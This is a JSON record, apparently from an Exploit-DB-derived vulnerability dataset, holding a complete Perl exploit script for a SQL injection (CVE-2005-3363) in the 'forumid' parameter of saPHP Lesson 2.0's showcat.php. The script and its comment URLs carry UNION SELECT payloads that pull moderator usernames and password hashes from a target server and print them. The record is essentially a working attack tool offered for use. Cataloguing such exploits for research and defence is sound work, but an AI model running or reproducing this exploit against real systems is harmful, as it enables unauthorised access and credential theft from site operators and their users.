{
  "id": "1530",
  "title": "saPHP Lesson 2.0 - &#039;forumid&#039; SQL Injection",
  "cve": "CVE-2005-3363",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# For password\r\n# http://www.example.com/path/showcat.php?forumid=-1%20union%20select%20ModPassword%20from%20modretor\r\n# For username\r\n# http://www.example.com/path/showcat.php?forumid=-1%20union%20select%20ModName%20from%20modretor\r\n# sent in by SnIpEr_SA (selfar2002[at]hotmail.com)\r\n# ported by str0ke (milw0rm.com)\r\n\r\nuse LWP::Simple;\r\n\r\n$serv     =  $ARGV[0];\r\n$path     =  $ARGV[1];\r\n\r\nsub usage\r\n {\r\n    print \"\\nSaphpLesson 2.0 SQL-Injection \\n\";\r\n    print \"By SnIpEr_SA Ported by str0ke\\n\";\r\n    print \"Usage: $0 www.example.com /directory/\\n\";\r\n    print \"sever    -  URL\\n\";\r\n    print \"path     -  path to showcat.php\\n\";\r\n    exit ();\r\n}\r\n\r\nsub exploit\r\n {\r\n    print qq(\r\n    SaphpLesson 2.0 SQL-Injection\r\n    By SnIpEr_SA Ported by str0ke\\n\\n);\r\n\r\n    $URL = sprintf(\"http://%s%sshowcat.php?forumid=-1+union+select+ModName+from+modretor\",$serv,$path);\r\n    $content = get \"$URL\";\r\n    if ($content =~ /(\\[)(.*)(\\]\\<\\/title\\>)/){&user;}else{print \"No Workie\\n\";}\r\n    $URL = sprintf(\"http://%s%sshowcat.php?forumid=-1+union+select+ModPassword+from+modretor\",$serv,$path);\r\n    $content = get \"$URL\";\r\n    if ($content =~ /(\\[)(\\w{32})(\\]\\<\\/title\\>)/){&showh;}else{print \"No Workie\\n\";}\r\n}\r\n\r\nsub user { print \"[*] Username: $2\\n\";}\r\nsub showh { print \"[*] Hash: $2\\n\\n\";}\r\n\r\nif (@ARGV != 2){&usage;}else{&exploit;}\r\n\r\n# milw0rm.com [2006-02-25]",
  "url": "https://www.exploit-db.com/exploits/1530"
}